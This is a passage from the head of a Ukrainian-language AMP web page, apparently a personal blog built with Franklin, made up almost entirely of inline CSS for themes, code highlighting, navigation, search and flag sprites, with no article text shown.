<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"amp lang=uk><script async src=https://cdn.ampproject.org/v0.js></script><meta charset=utf-8><meta content=width=device-width,minimum-scale=1,initial-scale=1 name=viewport><style amp-custom>.hljs{display:block;font-size:14px;line-height:1.45em;overflow-x:auto;padding:.5em;color:var(--text-color);background:var(--block-background)}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:var(--text-color);font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:var(--text-color);font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}:root{--block-background: var(--accent2);--small: 14px;--normal: 19px;--text-color: hsv(0, 0%, 20%)}.franklin-content .row{display:block}.franklin-content .left{float:left;margin-right:15px}.franklin-content .right{float:right}.franklin-content .container img{width:auto;padding-left:0;border-radius:10px}.franklin-content .footnote{position:relative;top:-.5em;font-size:70%}.franklin-toc li{margin:.6rem 0}.franklin-content{position:relative;padding-left:12.5%;padding-right:12.5%;line-height:1.35em}@media (min-width: 940px){.franklin-content{width:705px;margin-left:auto;margin-right:auto}}@media (max-width: 480px){.franklin-content{padding-left:6%;padding-right:6%}}.franklin-content h1{font-size:24px}.franklin-content h2{font-size:22px}.franklin-content h3{font-size:20px}.franklin-content h1,h2,h3,h4,h5,h6{text-align:left}.franklin-content h1{padding-bottom:.5em;border-bottom:3px double lightgrey;margin-top:1.5em;margin-bottom:1em}.franklin-content h2{padding-bottom:.3em;border-bottom:1px solid lightgrey;margin-top:2em;margin-bottom:1em}.franklin-content h1 a{color:inherit}.franklin-content h1 a:hover{text-decoration:none}.franklin-content h2 a{color:inherit}.franklin-content h2 a:hover{text-decoration:none}.franklin-content h3 a{color:inherit}.franklin-content h3 a:hover{text-decoration:none}.franklin-content h4 a{color:inherit}.franklin-content h4 a:hover{text-decoration:none}.franklin-content h5 a{color:inherit}.franklin-content h5 a:hover{text-decoration:none}.franklin-content h6 a{color:inherit}.franklin-content h6 a:hover{text-decoration:none}.franklin-content table{margin-left:auto;margin-right:auto;border-collapse:collapse;text-align:center}.franklin-content table *{line-height:.75rem}.franklin-toc ol ol{list-style-type:lower-alpha}.franklin-content th,td{font-size:var(--small);padding:10px;border:1px solid black}.franklin-content blockquote{background:var(--block-background);border-left:7px solid #a8a8a8;margin:1.5em 10px;padding:.5em 10px;font-style:italic}.franklin-content blockquote p{display:inline}.franklin-content li p{margin:10px 0}.franklin-content a{color:var(--alt2);text-decoration:none}.franklin-content a:hover{text-decoration:underline}.franklin-content .eqref a{color:green}.franklin-content .bibref a{color:green}.franklin-content sup{font-size:70%;vertical-align:super;line-height:0}.franklin-content sup a.fnref,.franklin-content td.fndef-backref a{overflow:visible;display:initial;padding-bottom:.3rem;padding-top:.2rem}.franklin-content table.fndef{margin:0 0 10px}.franklin-content .fndef tr,td{padding:0;border:0;text-align:left}.franklin-content .fndef tr{border-left:2px solid lightgray}.franklin-content .fndef td.fndef-backref{vertical-align:top;font-size:70%;padding-left:5px}.franklin-content .fndef td.fndef-content{font-size:80%;padding-left:10px;width:100%}.franklin-content img{width:70%;text-align:center;padding-left:10%}.franklin-content .img-small img{width:50%;text-align:center;padding-left:20%}body{counter-reset:eqnum}.katex{font-size:1em}.katex-display .katex{display:inline-block;white-space:normal}.katex-display:after{counter-increment:eqnum;content:"(" counter(eqnum) ")";position:relative;float:right;padding-right:5px}code{background-color:var(--block-background);padding:.1em .2em;border-radius:2px;font-size:var(--small);overflow:auto}code.plaintext{display:block}.scrollbox{width:10em;height:10em;overflow:auto;visibility:hidden}.scrollbox-content,.scrollbox:hover,.scrollbox:focus{visibility:visible}.scrollbox_delayed{transition:visibility .2s}.scrollbox_delayed:hover{transition:visibility 0s .2s}.hljs{font-size:var(--small);line-height:1.35em;border-radius:10px}.hljs-meta,.hljs-metas,.hljs-metap{font-weight:bold}.hljs-meta{color:#19b333}.hljs-metas{color:red}.hljs-metap{color:#3383e7}.franklin-content .colbox-blue{background-color:#eef3f5;padding:5px 10px;margin-left:5px;margin-top:5px;margin-bottom:5px;border-radius:0 10px 10px 0;border-left:5px solid #4c9cf1}body.light{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--alt4: #ffbebe;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: light){body{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body.dark{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: dark){body{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body{background:var(--background-color);font-style:var(--accent);font-family:Helvetica;padding:0 .5rem;line-height:2rem;color:var(--accent3);max-width:1280px;min-height:720px;margin:auto;min-width:320px}a{color:var(--accent)}a:visited{color:var(--accent2)}.author__place .author__bio{font-size:1rem}.franklin-content blockquote{border-left-color:var(--accent)}.franklin-content{color:var(--foreground-color)}.franklin-content #title a,.franklin-content .header-anchor{padding:.5rem;line-height:100%}.franklin-content a{outline-style:outset;outline-width:1px;padding:0 .1rem;margin:0 .1rem;outline-color:var(--alt2)}.franklin-content img{width:auto;text-align:center;padding:0}body>div>h1{text-align:center;color:var(--accent2)}body>div #title,body>div #page-description{text-align:center}.page__footer{margin-top:1rem;padding-top:1rem}.franklin-content .intro{font-size:1.2rem;text-align:left}.franklin-content .intro ul{list-style-type:none;font-size:1.1rem;font-style:italic}.franklin-content .intro a{font-variant:small-caps;padding-bottom:.2rem;font-size:1.4rem;font-style:normal}.franklin-content .intro .icon{padding:0 .2rem;font-size:1rem}.franklin-content .active-projects ul h4{font-size:1.5rem;font-variant:small-caps;font-style:normal;margin:.2rem}.franklin-content h3{font-size:.9rem}.posts_list h3{text-align:center}.svg-inline--fa.icon{width:1rem}.masthead__menu{height:4rem;line-height:4rem;padding:10px 0;position:relative}.site-title{float:left;font-weight:bold;width:15rem;font-size:1.5rem;text-decoration:none;color:var(--accent)}.site-title:visited{color:var(--accent)}#site-nav{float:right;font-size:1.5rem;font-family:Courier New;font-weight:bold;position:absolute;right:0}#site-nav .horiz ul{list-style-type:none;line-height:4rem;height:4rem;margin:0}#site-nav .horiz ul>li{padding:0 .5rem;box-shadow:.25rem -.025rem .05rem var(--alt)}#site-nav .horiz ul>li{float:left;border-top:0;border-bottom:0;border-left:0;border-radius:50% 25% 25% 50%}#site-nav ul>li>a,#site-nav ul>li>button{color:var(--alt);display:inline-block}#site-nav .menu-icons{position:relative;padding:0 .2rem}#site-nav{display:block;width:auto;height:auto}.masthead__inner-wrap{display:block;width:100%;padding:10px 0;height:inherit}.author__avatar>img{width:4em;height:4em;border-radius:50%;object-fit:cover;border-width:.1rem;border-color:var(--accent3);border-style:solid;box-shadow:.1rem .06rem var(--accent3),-.05rem -.025rem .2rem var(--accent3)}#site-nav a:link{text-decoration:none}#site-nav .vert,#site-nav .ham{display:none}.author__avatar{object-fit:contain;float:left}.author__name{display:none}.author__place{font-size:.65em}.author__wrap>ul{float:left;height:inherit;margin:0;padding:0 10px}.author__wrap>ul>li{position:relative;float:left;list-style-type:none;font-size:1rem;padding:0 .2rem;text-align:center}.page__footer ul>li{list-style-type:none}ul>li.author__urls{font-size:2rem}ul>li.author__urls a:visited{color:var(--accent)}ul>li.author__urls a:hover{filter:drop-shadow(.1rem .1rem 0 var(--accent2)) brightness(1.5);filter:brightness(1.5);transition-property:-moz-filter,-ms-filter,-o-filter,-webkit-filter,filter;transition-duration:.2s}ul>li.author__place a{color:var(--accent3);text-decoration:none;text-shadow:0 0 .01rem var(--alt2)}.author__wrap .author__avatar{float:left}.langs-dropdown-wrapper{cursor:pointer}.langs-dropdown-content{display:none;text-align:left}.langs-dropdown-content.show{display:block}.langs-dropdown-content a{display:block}.menu-lang-btn:before{border-radius:25% 25% 25% 50%}@media (max-width: 680px){.lang-link{height:3rem}}.lang-link .flag-icon,.lang-link .flag{position:absolute;left:1rem;margin-top:.65rem}#site-nav .langs-dropdown-menu{left:1.5rem;position:relative;top:1rem}#site-nav .langs-dropdown-menu .lang-list{font-size:1rem;line-height:2rem;overflow-x:hidden;height:20rem;position:absolute;overflow-y:scroll;right:1rem;scrollbar-width:thin;border:solid;border-radius:25%;border-width:0 0 0 .25rem;transition:height;padding-left:3rem}#site-nav .langs-dropdown-menu .lang-link:hover{color:var(--foreground-color)}.lang-list{background-color:var(--background-color)}#site-nav ul>li>button{background:inherit;border:inherit;font-size:inherit;font-family:inherit;font-weight:inherit;padding:inherit;margin:inherit;list-style-type:inherit;line-height:inherit;height:inherit}.page-foot{font-size:.7em;line-height:1.25em;text-align:right;display:inline-block;width:100%}.franklin-content{padding:0 0 2rem;z-index:0}.franklin-content,.tag-content{padding-top:1rem}.author__bio li{list-style:none}.author__bio li p{margin:0;padding:0}#tag-name{font-size:1.5rem;padding:.5rem;font-weight:bold;font-variant:small-caps}#tag_title{font-variant:small-caps}#tag_title .wrap{text-align:left}#tag_title>.wrap>*{display:inline-block;text-align:left}#tag_cloud{font-weight:bold}.posts_list.franklin-content>ul{list-style-type:"> "}.posts_list.franklin-content>.title{font-variant:small-caps}.posts_list.franklin-content>.title>h2{font-size:1rem;font-style:italic}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title>a>h1{display:inline}.posts_list.franklin-content>ul>li{line-height:1.2rem;padding:.1rem}.posts_list.franklin-content>ul>li>p{padding:.1rem;margin:.1rem}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title{text-align:center;display:block;margin:1rem}.page__footer-links>ul>li>a{padding:.2rem;margin:.2rem}#tag_cloud>a{padding:.2rem;font-variant:small-caps;vertical-align:middle;margin:.3rem;display:inline-block;text-decoration:none;text-shadow:0 0 5rem white}#tag_cloud .icon{font-size:1rem;vertical-align:middle;margin-right:.2rem;margin-left:.2rem}#tag_cloud_wrapper{display:inline-block;width:100%;text-align:center}#post-tags-list{font-variant:small-caps;font-weight:bold}.media{font-size:1.5rem;line-height:2rem}#library .book-author{color:var(--accent2);font-size:.9rem;display:inline}.shows_list h3{font-size:1.5rem}a.imdb{padding:0 .5rem}#searchResults ul li{margin-bottom:1rem}.lunrSearchForm{margin-right:-.4rem;font-size:0;overflow:hidden}.lunrSearchForm .search-input{background:var(--background-color);color:var(--alt);border-width:.2rem;border:none;outline:none;border-radius:50% 25% 25% 50%;line-height:1.75rem;padding:.5rem 0 .5rem 2.25rem;width:7rem;position:relative;top:.5rem;font-family:"Courier New";font-weight:bold;font-size:1.5rem}.lunrSearchForm .search-input:focus{background:var(--block-background)}.lunrSearchForm .search-button{color:var(--alt);background:none;border:none;font-size:1.5rem;padding:.2rem .2rem .2rem 0;position:absolute;top:1rem;left:.75rem;z-index:1;cursor:pointer}.lunrSearchForm .search-button:focus{color:var(--accent)}@media (min-width: 680px) and (max-width: 1300px){.lunrSearchForm .search-input{font-size:1rem;padding-left:2.75rem;width:4.5rem;border-radius:50% 100% 100% 50%}}@media (max-width: 680px){.lunrSearchForm{display:block;width:28rem}.lunrSearch{position:absolute;top:-4rem;display:block;left:0;width:calc(2rem + 90%)}.lunrSearch .search-input{width:26rem}}@media (max-width: 480px){.lunrSearchForm .search-input{width:18rem;left:-4rem}}.result-title a{text-decoration:none}.result-title a:hover{text-decoration:underline}.result-preview{color:gray}.resultCount{color:gray}.result-query{font-weight:bold}.lunrSearchForm{margin-top:1em}footer>*{float:left}footer a{text-decoration:underline dotted}footer ul.author__wrap>li{float:left;padding:0 .2rem}footer ul.author__wrap>li a{line-height:2rem;height:inherit;display:block}footer ul.author__wrap{float:right;margin:0}footer .page__footer-copyright{margin:0}footer .page__footer-links{margin:0 .2rem 0 .4rem}footer .page__footer-links ul{display:inline;margin:0 .4rem 0 0;padding:0}footer .page__footer-links li{display:inline}@media (min-width: 680px){#tag-name,.tag-desc{text-align:left}}@media (min-width: 680px) and (max-width: 1300px){body{max-width:640px;min-height:320px}#site-nav{position:relative;z-index:1}#site-nav .ham:hover{cursor:pointer}#site-nav .ham{outline:none}#site-nav .ham,#site-nav .ham-icon{display:block;height:3rem;line-height:3rem;position:absolute;right:0;top:0;text-align:right;background:transparent;border:none;font-size:3rem;color:var(--accent)}#site-nav .horiz{display:none}#site-nav .vert{display:block;float:none;position:absolute;right:0;top:3rem;width:9rem;padding-left:1rem;max-height:0rem;overflow:hidden;filter:blur(1rem);transition:max-height .33s ease-in,filter .33s ease-in}#site-nav .vert ul{margin:0;padding:10px 0}#site-nav .vert ul>li{width:100%;text-align:center;border-radius:25% 50% 50% 25%;adding:.5rem 1rem;box-shadow:-.25rem 0 .05rem var(--alt)}}@media (max-width: 680px){.masthead,.masthead__inner-wrap,.masthead__menu{display:block}.site-title{float:none;width:100%;display:block;text-align:center}.author__wrap{float:none;display:block;width:100%;height:4.4rem;text-align:center}.author__wrap ul{width:auto;float:none;padding:0;display:inline-block}#tag-name,.tag-desc{text-align:center}#site-nav{float:none;padding:10px 0;position:relative;top:4rem}#site-nav ul li{float:none}.horiz{text-align:center}#site-nav ul{display:inline-block;padding:0}.masthead{height:14rem}.page__footer{width:100%;display:block}.page__footer{text-align:center}footer{display:inline-block;text-align:center}footer>*{display:inline-block;float:none}footer ul.author__wrap{float:none}footer .author__urls.social-icons{font-size:1rem}.page-foot .copyright{display:inline-block}}@media (max-width: 480px){.masthead{height:30rem}#site-nav{top:5rem}#site-nav .horiz ul{width:100%}#site-nav .horiz ul>li{width:calc(100% - 2rem);float:none}}@media (min-width: 480px) and (max-width: 680px){.masthead{height:20rem}}@media (max-width: 680px){body{overflow-x:hidden}#site-nav{z-index:1}#site-nav .horiz ul>li{float:none;top:-4rem;position:relative;margin-top:1rem;margin-bottom:0}footer ul.author__wrap{margin-top:1rem;text-align:center;margin-left:0;padding-left:0}footer ul.author__wrap>li{float:none;display:inline-block}.page__footer{margin-top:3.5rem}}.site-title{-webkit-backface-visibility:hidden;backface-visibility:hidden;font-size:1.5rem;font-family:"VT323",monospace,sans-serif;color:var(--accent2);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.site-title:after{content:"​";position:relative;padding-right:.5em;border-right:.5em solid var(--accent);white-space:nowrap;-webkit-animation:chars 5.52s linear 1s forwards,cursor 1s 3;animation:chars 5.52s linear 1s forwards,cursor 1s 3}.hvr-buzz-out{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px #0000}.hvr-buzz-out:hover,.hvr-buzz-out:focus,.hvr-buzz-out:active{-webkit-animation-name:hvr-buzz-out;animation-name:hvr-buzz-out;-webkit-animation-duration:.75s;animation-duration:.75s;-webkit-animation-timing-function:linear;animation-timing-function:linear;-webkit-animation-iteration-count:1;animation-iteration-count:1}.franklin-content a{display:inline-block;vertical-align:middle;text-decoration:none;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative;overflow:hidden}.franklin-content a:before{content:"";position:absolute;z-index:-1;left:51%;right:51%;bottom:0;background:var(--accent);height:4px;-webkit-transition-property:left,right;transition-property:left,right;-webkit-transition-duration:.3s;transition-duration:.3s;-webkit-transition-timing-function:ease-out;transition-timing-function:ease-out}.franklin-content a:hover:before,.franklin-content a:focus:before,.franklin-content a:active:before{left:0;right:0}.hvr-outline-in{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative}.horiz .hvr-outline-in:before{border-radius:50% 25% 25% 50%;right:-.25rem}.vert .hvr-outline-in:before{border-radius:25% 50% 50% 25%;left:-.25rem}.hvr-outline-in:before{pointer-events:none;content:"";position:absolute;border:var(--alt) solid .25rem;top:0;bottom:0;left:0;opacity:0;-webkit-transition-duration:.2s;transition-duration:.2s;-webkit-transition-property:top,right,bottom,left;transition-property:top,right,bottom,left}.horiz .hvr-outline-in:hover:before,.horiz .hvr-outline-in:focus:before,.horiz .hvr-outline-in:active:before{top:-.5rem;right:-.5rem;bottom:-.5rem;left:0;opacity:1}.vert .hvr-outline-in:hover:before,.vert .hvr-outline-in:focus:before,.vert .hvr-outline-in:active:before{top:-.5rem;right:0;bottom:-.5rem;left:-.5rem;opacity:1}#site-nav .vert:before{background-color:var(--background-color);filter:blur(.25rem);content:"";height:100%;width:100%;position:absolute}.author__avatar{background-color:transparent;perspective:1000px}.masthead__menu ul li.author__avatar img{transition:transform .8s;transform-style:preserve-3d}.masthead__menu li.author__avatar:hover img{transform:rotateY(180deg);cursor:pointer}body.light .hljs{display:block;overflow-x:auto;padding:.5em;color:#000;background:#f8f8ff}body.light .hljs-comment,body.light .hljs-quote{color:#408080;font-style:italic}body.light .hljs-keyword,body.light .hljs-literal,body.light .hljs-selector-tag,body.light .hljs-subst{color:#954121}body.light .hljs-number{color:#40a070}body.light .hljs-doctag,body.light .hljs-string{color:#219161}body.light .hljs-section,body.light .hljs-selector-class,body.light .hljs-selector-id,body.light .hljs-type{color:#19469d}body.light .hljs-params{color:#00f}body.light .hljs-title{color:#458;font-weight:700}body.light .hljs-attribute,body.light .hljs-name,body.light .hljs-tag{color:navy;font-weight:400}body.light .hljs-template-variable,body.light .hljs-variable{color:teal}body.light .hljs-link,body.light .hljs-regexp{color:#b68}body.light .hljs-bullet,body.light .hljs-symbol{color:#990073}body.light .hljs-built_in,body.light .hljs-builtin-name{color:#0086b3}body.light .hljs-meta{color:#999;font-weight:700}body.light .hljs-deletion{background:#fdd}body.light .hljs-addition{background:#dfd}body.light .hljs-emphasis{font-style:italic}body.light .hljs-strong{font-weight:700}.flag{display:inline-block;position:relative;width:16px;height:11px;background:url(/assets/flags.png) no-repeat}.flag.flag-gu{background-position:-96px -55px}.flag.flag-mn{background-position:-208px -88px}.flag.flag-va{background-position:-48px -154px}.flag.flag-tibet{background-position:-32px -143px}.flag.flag-fo{background-position:-64px -44px}.flag.flag-th{background-position:-16px -143px}.flag.flag-tr{background-position:-144px -143px}.flag.flag-tl{background-position:-80px -143px}.flag.flag-kz{background-position:-144px -77px}.flag.flag-zm{background-position:-16px -165px}.flag.flag-uz{background-position:-32px -154px}.flag.flag-dk{background-position:-64px -33px}.flag.flag-scotland{background-position:-176px -121px}.flag.flag-gi{background-position:-224px -44px}.flag.flag-gy{background-position:-128px -55px}.flag.flag-bj{background-position:-112px -11px}.flag.flag-fr{background-position:-80px -44px}.flag.flag-mo{background-position:-224px -88px}.flag.flag-ir{background-position:-112px -66px}.flag.flag-io{background-position:-80px -66px}.flag.flag-tm{background-position:-96px -143px}.flag.flag-ch{background-position:-96px -22px}.flag.flag-mt{background-position:-32px -99px}.flag.flag-nl{background-position:-240px -99px}.flag.flag-gp{background-position:-16px -55px}.flag.flag-im{background-position:-48px -66px}.flag.flag-tv{background-position:-176px -143px}.flag.flag-mu{background-position:-48px -99px}.flag.flag-pe{background-position:-96px -110px}.flag.flag-vi{background-position:-112px -154px}.flag.flag-hn{background-position:-176px -55px}.flag.flag-ss{background-position:-128px -132px}.flag.flag-ae{background-position:-16px 0}.flag.flag-td{background-position:-240px -132px}.flag.flag-pw{background-position:0 -121px}.flag.flag-nu{background-position:-32px -110px}.flag.flag-bt{background-position:-208px -11px}.flag.flag-ms{background-position:-16px -99px}.flag.flag-cv{background-position:-240px -22px}.flag.flag-es{background-position:-224px -33px}.flag.flag-mh{background-position:-144px -88px}.flag.flag-la{background-position:-160px -77px}.flag.flag-vn{background-position:-128px -154px}.flag.flag-py{background-position:-16px -121px}.flag.flag-br{background-position:-176px -11px}.flag.flag-ye{background-position:-224px -154px}.flag.flag-ie{background-position:0 -66px}.flag.flag-gh{background-position:-208px -44px}.flag.flag-cg{background-position:-80px -22px}.flag.flag-cu{background-position:-224px -22px}.flag.flag-hu{background-position:-224px -55px}.flag.flag-sg{background-position:-224px -121px}.flag.flag-at{background-position:-176px 0}.flag.flag-lk{background-position:-224px -77px}.flag.flag-vu{background-position:-144px -154px}.flag.flag-bo{background-position:-160px -11px}.flag.flag-jo{background-position:-208px -66px}.flag.flag-er{background-position:-208px -33px}.flag.flag-za{background-position:-256px -154px}.flag.flag-rs{background-position:-80px -121px}.flag.flag-nr{background-position:-16px -110px}.flag.flag-ls{background-position:-256px -77px}.flag.flag-jm{background-position:-192px -66px}.flag.flag-tz{background-position:-208px -143px}.flag.flag-ki{background-position:-16px -77px}.flag.flag-sj{background-position:0 -132px}.flag.flag-cz{background-position:-16px -33px}.flag.flag-pg{background-position:-128px -110px}.flag.flag-lv{background-position:-32px -88px}.flag.flag-do{background-position:-96px -33px}.flag.flag-lu{background-position:-16px -88px}.flag.flag-no{background-position:-256px -99px}.flag.flag-kw{background-position:-112px -77px}.flag.flag-mx{background-position:-96px -99px}.flag.flag-yt{background-position:-240px -154px}.flag.flag-ly{background-position:-48px -88px}.flag.flag-cy{background-position:0 -33px}.flag.flag-ph{background-position:-144px -110px}.flag.flag-my{background-position:-112px -99px}.flag.flag-sm{background-position:-48px -132px}.flag.flag-et{background-position:-240px -33px}.flag.flag-ru{background-position:-96px -121px}.flag.flag-tj{background-position:-48px -143px}.flag.flag-ai{background-position:-64px 0}.flag.flag-pl{background-position:-176px -110px}.flag.flag-kp{background-position:-64px -77px}.flag.flag-uy{background-position:-16px -154px}.flag.flag-gb{background-position:-112px -44px}.flag.flag-gs{background-position:-64px -55px}.flag.flag-kurdistan{background-position:-96px -77px}.flag.flag-rw{background-position:-112px -121px}.flag.flag-ec{background-position:-128px -33px}.flag.flag-mm{background-position:-192px -88px}.flag.flag-pa{background-position:-80px -110px}.flag.flag-wales{background-position:-160px -154px}.flag.flag-kg{background-position:-256px -66px}.flag.flag-ve{background-position:-80px -154px}.flag.flag-tk{background-position:-64px -143px}.flag.flag-ca{background-position:-16px -22px}.flag.flag-is{background-position:-128px -66px}.flag.flag-ke{background-position:-240px -66px}.flag.flag-ro{background-position:-64px -121px}.flag.flag-gq{background-position:-32px -55px}.flag.flag-pt{background-position:-256px -110px}.flag.flag-tf{background-position:-256px -132px}.flag.flag-ad{background-position:0 0}.flag.flag-sk{background-position:-16px -132px}.flag.flag-pm{background-position:-192px -110px}.flag.flag-om{background-position:-64px -110px}.flag.flag-an{background-position:-112px 0}.flag.flag-ws{background-position:-192px -154px}.flag.flag-sh{background-position:-240px -121px}.flag.flag-mp{background-position:-240px -88px}.flag.flag-gt{background-position:-80px -55px}.flag.flag-cf{background-position:-64px -22px}.flag.flag-zanzibar{background-position:0 -165px}.flag.flag-mw{background-position:-80px -99px}.flag.flag-catalonia{background-position:-32px -22px}.flag.flag-ug{background-position:-240px -143px}.flag.flag-je{background-position:-176px -66px}.flag.flag-km{background-position:-32px -77px}.flag.flag-in{background-position:-64px -66px}.flag.flag-bf{background-position:-48px -11px}.flag.flag-mc{background-position:-80px -88px}.flag.flag-sy{background-position:-192px -132px}.flag.flag-sn{background-position:-64px -132px}.flag.flag-kr{background-position:-80px -77px}.flag.flag-eu{background-position:-256px -33px}.flag.flag-bn{background-position:-144px -11px}.flag.flag-st{background-position:-144px -132px}.flag.flag-england{background-position:-192px -33px}.flag.flag-lc{background-position:-192px -77px}.flag.flag-dm{background-position:-80px -33px}.flag.flag-be{background-position:-32px -11px}.flag.flag-ni{background-position:-224px -99px}.flag.flag-ua{background-position:-224px -143px}.flag.flag-mz{background-position:-128px -99px}.flag.flag-pf{background-position:-112px -110px}.flag.flag-tn{background-position:-112px -143px}.flag.flag-ee{background-position:-144px -33px}.flag.flag-xk{background-position:-208px -154px}.flag.flag-sx{background-position:-176px -132px}.flag.flag-sd{background-position:-192px -121px}.flag.flag-gd{background-position:-128px -44px}.flag.flag-ci{background-position:-112px -22px}.flag.flag-sz{background-position:-208px -132px}.flag.flag-cl{background-position:-144px -22px}.flag.flag-fi{background-position:0 -44px}.flag.flag-ga{background-position:-96px -44px}.flag.flag-jp{background-position:-224px -66px}.flag.flag-de{background-position:-32px -33px}.flag.flag-np{background-position:0 -110px}.flag.flag-re{background-position:-48px -121px}.flag.flag-bg{background-position:-64px -11px}.flag.flag-sc{background-position:-160px -121px}.flag.flag-ng{background-position:-208px -99px}.flag.flag-qa{background-position:-32px -121px}.flag.flag-mk{background-position:-160px -88px}.flag.flag-aw{background-position:-208px 0}.flag.flag-kn{background-position:-48px -77px}.flag.flag-al{background-position:-80px 0}.flag.flag-bw{background-position:-240px -11px}.flag.flag-um{background-position:-256px -143px}.flag.flag-ky{background-position:-128px -77px}.flag.flag-tt{background-position:-160px -143px}.flag.flag-so{background-position:-80px -132px}.flag.flag-lt{background-position:0 -88px}.flag.flag-by{background-position:-256px -11px}.flag.flag-bb{background-position:0 -11px}.flag.flag-us{background-position:0 -154px}.flag.flag-md{background-position:-96px -88px}.flag.flag-ag{background-position:-48px 0}.flag.flag-hm{background-position:-160px -55px}.flag.flag-as{background-position:-160px 0}.flag.flag-eg{background-position:-160px -33px}.flag.flag-sv{background-position:-160px -132px}.flag.flag-sl{background-position:-32px -132px}.flag.flag-fk{background-position:-32px -44px}.flag.flag-am{background-position:-96px 0}.flag.flag-ck{background-position:-128px -22px}.flag.flag-tw{background-position:-192px -143px}.flag.flag-kh{background-position:0 -77px}.flag.flag-to{background-position:-128px -143px}.flag.flag-se{background-position:-208px -121px}.flag.flag-cd{background-position:-48px -22px}.flag.flag-pn{background-position:-208px -110px}.flag.flag-gr{background-position:-48px -55px}.flag.flag-id{background-position:-256px -55px}.flag.flag-vc{background-position:-64px -154px}.flag.flag-somaliland{background-position:-96px -132px}.flag.flag-bi{background-position:-96px -11px}.flag.flag-pk{background-position:-160px -110px}.flag.flag-pr{background-position:-224px -110px}.flag.flag-bd{background-position:-16px -11px}.flag.flag-co{background-position:-192px -22px}.flag.flag-fm{background-position:-48px -44px}.flag.flag-bm{background-position:-128px -11px}.flag.flag-ar{background-position:-144px 0}.flag.flag-bv{background-position:-224px -11px}.flag.flag-sb{background-position:-144px -121px}.flag.flag-mq{background-position:-256px -88px}.flag.flag-eh{background-position:-176px -33px}.flag.flag-bh{background-position:-80px -11px}.flag.flag-it{background-position:-144px -66px}.flag.flag-hr{background-position:-192px -55px}.flag.flag-sa{background-position:-128px -121px}.flag.flag-mv{background-position:-64px -99px}.flag.flag-mg{background-position:-128px -88px}.flag.flag-dz{background-position:-112px -33px}.flag.flag-gg{background-position:-192px -44px}.flag.flag-gm{background-position:-256px -44px}.flag.flag-af{background-position:-32px 0}.flag.flag-li{background-position:-208px -77px}.flag.flag-sr{background-position:-112px -132px}.flag.flag-vg{background-position:-96px -154px}.flag.flag-cr{background-position:-208px -22px}.flag.flag-tc{background-position:-224px -132px}.flag.flag-ao{background-position:-128px 0}.flag.flag-ma{background-position:-64px -88px}.flag.flag-mr{background-position:0 -99px}.flag.flag-gn{background-position:0 -55px}.flag.flag-ne{background-position:-176px -99px}.flag.flag-nf{background-position:-192px -99px}.flag.flag-wf{background-position:-176px -154px}.flag.flag-hk{background-position:-144px -55px}.flag.flag-gf{background-position:-160px -44px}.flag.flag-ps{background-position:-240px -110px}.flag.flag-ic{background-position:-240px -55px}.flag.flag-cw{background-position:-256px -22px}.flag.flag-ml{background-position:-176px -88px}.flag.flag-ax{background-position:-224px 0}.flag.flag-gl{background-position:-240px -44px}.flag.flag-dj{background-position:-48px -33px}.flag.flag-cn{background-position:-176px -22px}.flag.flag-ht{background-position:-208px -55px}.flag.flag-lr{background-position:-240px -77px}.flag.flag-tg{background-position:0 -143px}.flag.flag-ba{background-position:-256px 0}.flag.flag-ge{background-position:-144px -44px}.flag.flag-bz{background-position:0 -22px}.flag.flag-au{background-position:-192px 0}.flag.flag-iq{background-position:-96px -66px}.flag.flag-cm{background-position:-160px -22px}.flag.flag-gw{background-position:-112px -55px}.flag.flag-az{background-position:-240px 0}.flag.flag-na{background-position:-144px -99px}.flag.flag-fj{background-position:-16px -44px}.flag.flag-zw{background-position:-32px -165px}.flag.flag-bs{background-position:-192px -11px}.flag.flag-il{background-position:-16px -66px}.flag.flag-nz{background-position:-48px -110px}.flag.flag-me{background-position:-112px -88px}.flag.flag-si{background-position:-256px -121px}.flag.flag-nc{background-position:-160px -99px}.flag.flag-lb{background-position:-176px -77px}</style><style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal 